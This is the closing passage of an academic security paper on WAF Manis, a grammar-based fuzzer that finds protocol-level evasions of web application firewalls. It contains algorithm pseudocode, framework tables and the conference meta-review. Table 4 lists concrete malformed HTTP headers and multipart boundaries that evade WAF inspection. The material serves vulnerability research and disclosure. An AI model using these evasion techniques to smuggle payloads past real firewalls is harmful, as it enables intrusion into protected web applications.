[46] M. Zalewski, “american fuzzy lop,” https://lcamtuf.coredump.cx/afl/.
[47] L. Zheng, X. Li, C. Wang, R. Guo, H. Duan, J. Chen, C. Zhang,
     and K. Shen, “Reqsminer: Automated discovery of cdn forwarding
     request inconsistencies with differential fuzzing,” in NDSS, 2024.
[48] Y.-H. Zou, J.-J. Bai, J. Zhou, J. Tan, C. Qin, and S.-M. Hu, “TCP-
     Fuzz: Detecting memory and semantic bugs in TCP stacks with
     fuzzing,” in 2021 USENIX Annual Technical Conference (USENIX
     ATC 21). USENIX Association, Jul. 2021, pp. 489–502. [Online].
     Available: https://www.usenix.org/conference/atc21/presentation/zou
A.2. Algorithms

Algorithm 1 Generation Algorithm                        Algorithm 2 Evasion Sample Centrifuge
Require: grammar rules G                                Require: Evasion sample t
Ensure: sample tree t sample message m                  Ensure: corpus samples cmin evasion samples smin
 1: t.root ← root                                        1: q ← new Queue;
 2: m ← empty string                                     2: q .push(t)
 3: q ← new Queue                                        3: while !q .empty() do
 4: q .push tail(t.root)                                 4:     node pool ← []
 5: while !q .empty() do                                 5:     tnow ← q .pop tail()
 6:     cnow ← q .pop tail()                             6:     for all node in tnow do
 7:     if len(G[cnow ])> 0 then                         7:        if      !node.visited   and     !node.is leaf   and
 8:        children ←weighted random choice(G[cnow ])              !node.deleted then
 9:        cnow .chidlren ← children                     8:            node pool.append(node)
10:        children ← reverse(children)                  9:        end if
11:        for all child in children do                 10:     end for
12:            q .push head(child)                      11:     if len(node pool) = 0 then
13:        end for                                      12:        smin .append(tnow .dump to raw packet())
14:     else                                            13:     end if
15:        cnow .is terminal ← true                     14:     for all node in node pool do
16:     end if                                          15:        target.visited ← true
17: end while                                           16:        target.deleted ← true
18: q .push tail(t.root)                                17:        req ← tnow .dump to raw packet()
19: while !q .empty() do                                18:        accepted, req ← waf verfication(req )
20:     cnow ← q .pop tail()                            19:        if accepted then
21:     if cnow .is terminal then                       20:            if !webapp verfication(req ) then
22:        m ← m + cnow .to str()                       21:               continue
23:     end if                                          22:            end if
24:     children ←reverse(cnow .children)               23:        else
25:     for all child in children do                    24:            cmin .append(tnow )
26:        q .push head(child)                          25:            target.deleted ← false
27:     end for                                         26:        end if
28: end while                                           27:        q .push(tnow )
29: return t, m                                         28:     end for
                                                        29: end while
A.3. Evaluation Details

 HTTP Field                   Descripition                               Example                                                             Vulnerability

                              malformed boundary token                   multipart/form-data; boundary*=”boundary”                           MPS
                              malformed boundary parameter separator     multipart/form-data&boundary=boundary&                              MPS
 Content-Type Header
                              urlencoded-form with charset parameter     application/x-www-from-urlencoded; charset=utf-7                    RSG
                              variant json content type                  application/x-a-json                                                PTC


                              malformed form-data token                  fo-data; name=”taint key”                                           MPS
 Content-Disposition Header
                              fake file indicator                        form-data; name=”taint key”; Content-Disposition:;filename*=””      PTC


                              formdata boundary terminator missing lf    –boundary–\r                                                        MPS
 Boundary Seperator
                              formdata boundary startline missing cr     –boundary\n                                                         MPS
                              empty boundary token                       –\r\n                                                               MPS

                                  TABLE 4. E XAMPLES OF PARSING VULNERABILITIES FOUND BY WAF M ANIS



 Web               Path parameters                   Query parameters                    Header parameters                    Body parameters
 Framework
 Laravel           Route::get(’/{taint key}’)        $request->query(’taint key’);       $request->header(’header’);          $request->input(’taint key’);
 gin               router.GET(”/:taint key”,         Context.query(”taint key”)          Context.GetHeader(”taint key”)       Context.PostForm(”taint key”)
                   func(c *gin.Context) { value
                   := c.Param(”taint key”) })
 beego             Controller.Ctx.Input.             Controller.GetString(”taint key”) Controller.Ctx.Request.                Controller.Parseform(&message);
                   Param(”:taint key”)                                                 Header[’taint key’]                    message.taint key
 echo              c.Param(”taint key”)              c.QueryParam(”taint key”)         c.Request().Header[”taint key”]        c.FormValue(”taint key”)
 springboot        @PathVariable            String   @RequestParam(”taint key”)        @RequestHeader(”taint key”)            @RequestParam(”taint key”)
                   taint key
 express           req.params[”taint key”]           req.query[”taint key”]              req.headers.[”taint key”]            req.body[”taint key”]
 codeigniter       $routes->get(’/(:taint key)’,     $request->getGet(’taint key’)       $request->header(’taint key’)        $request->getPost(’taint key’)
                   ’controller:method’)
 symfony           @Route(”{taint key}”              $request->query-                    $request->header-                    $request->request-
                                                     >get(’taint key’)                   >get(’taint key’)                    >get(’taint key’)
 flask             @app.route(”/ <taint key>”)       flask.request.args[’taint key’]     flask.request.headers[’taint key’]   flask.request.form[’taint key’]
 django            path(”/ <taint key>”)             request.GET.get(’taint key’)        request.header.get(’taint key’)      request.POST.get(’taint key’)
 fastapi           @app.get(”/{taint key}”)          taint key:Annotated[str         |   taint key: Annotated [str |          taint key: Annotated[str |
                                                     None, Query()]                      None, Header()]                      None, Form()]
 webpy             regex match from path             web.input()[’taint key’]            web.ctx.env.get(’TAINT KEY’)         web.input()[’taint key’]
 rocket            #[get(”/     <taint key>”)]fn     #[get(”/?     <taint key>”)]fn      Request                              form: Form <MyForm>;
                   handler(taint key: &str)          handler(taint key: &str) {}         <’r>::headers().get(”taint key”)     form.taint key
                                                                                         .collect()
 rails             get ’/:taint key’                 params[:taint key]                  request.headers[”taint key”]         params[:taint key]
 koa               router.get(’/:taint key’, (ctx, ctx.query.taint key                   ctx.request.header.taint key         ctx.request.body.taint key
                   next)       =>{        ctx.params
                   .taint key});
 nestjs            @Param() params.taint key         @Query() query.taint key            @Headers() header.taint key          @Body() body.taint key
 meteor            FlowRouter.getParam(’taint key’) FlowRouter.getQueryParam             req.headers.taint key                req.body.taint key
                                                     (’taint key’)
 Fastify           fastify.get(’/:taint key’,        request.query.taint key             request.headers.taint key            request.body.taint key
                   function (request, reply) {const
                   { taint } = request.params;})
 sails             req.param.taint key               req.query.taint key                 req.headers.taint key                req.body.taint key
 aspnetcore        [HttpGet(”{taint key}”)]          [FromQuery(Name                =    Request.Headers.TryGetValue          [FromForm]myForm
                                                     ”taint key”)] string taint key      (’taint key’,      out   var         myForm.taint key
                                                                                         headerValue)
                                   TABLE 5. T ESTED G ET PARAMETER F UNCTION OF EACH WEB FRAMEWORK
Appendix B.                                                       Appendix C.
Meta-Review                                                       Response to the Meta-Review
    The following meta-review was prepared by the program             We sincerely thank the reviewers for their valuable feed-
committee for the 2024 IEEE Symposium on Security and             back. In response to the noteworthy concern:
Privacy (S&P) as part of the review process as detailed in            We acknowledge that WAFs that lack well-maintained
the call for papers.                                              rules could be trivial to bypass. However, a well-configured
                                                                  and diligently maintained WAF can offer significant security
B.1. Summary                                                      protection. The baseline experiments show that established
                                                                  security tools like SQLmap and WAFNinja cannot bypass
    This paper proposes a new automated approach to detect        commercially deployed WAFs today. Moreover, WAF ven-
protocol-level evasion vulnerabilities in web application fire-   dors like Alibaba Cloud offers a bug bounty reward of
walls (WAFs). The approach, implemented as WAS Manis,             approximately USD 800 for each identified WAF evasion
takes in a manually-constructed HTTP grammar from RFCs,           vulnerability, which emphasizes the industry’s recognition
and generates and mutates different requests that might           of WAF evasion and the difficulty of bypassing a robustly
cause web applications to not detect a malicious payload.         configured WAF.
A key insight of the work is that black-box fuzzing of
commercial WAFs is not effective, so instead they use
open-source WAFs to perform initial payload generation
for testing against commercial WAFs. The authors use their
approach to test 14 popular WAFs and 20 web frameworks,
uncovering vulnerabilities across all tested targets. The au-
thors analyzed the discovered vulnerabilities and identified
three underlying reasons contributing to WAF evasions.

B.2. Scientific Contributions
  • Addresses a Long-Known Issue
  • Identifies an Impactful Vulnerability
  • Provides a Valuable Step Forward in an Established
    Field

B.3. Reasons for Acceptance
 1) The work addresses a long-known issue by improving
    and automating detection of protocol evasion attacks
    against web application firewalls. By leveraging trans-
    ferability of inputs between WAFs the proposed tech-
    nique improves the efficiency of exploring the input
    space.
 2) The work identifies many instances of exploitable pro-
    tocol evasion attacks by applying the proposed tech-
    niques. While the existence of this class of attacks is
    previously-known, the breadth of concrete examples
    motivates the impact of these vulnerabilities and ac-
    companying disclosures improve real-world software
    security.
 3) The work provides a valuable step forward by leverag-
    ing input transferability between algorithm implemen-
    tations, allowing open source software to be used for
    improved fuzzing of closed-source implementations.

B.4. Noteworthy Concerns
    WAFs are of limited tangible security value, as they
are known to be relatively easy to evade. There is little
evidence that WAFs slow sophisticated adversaries, limiting
the impact of the work.
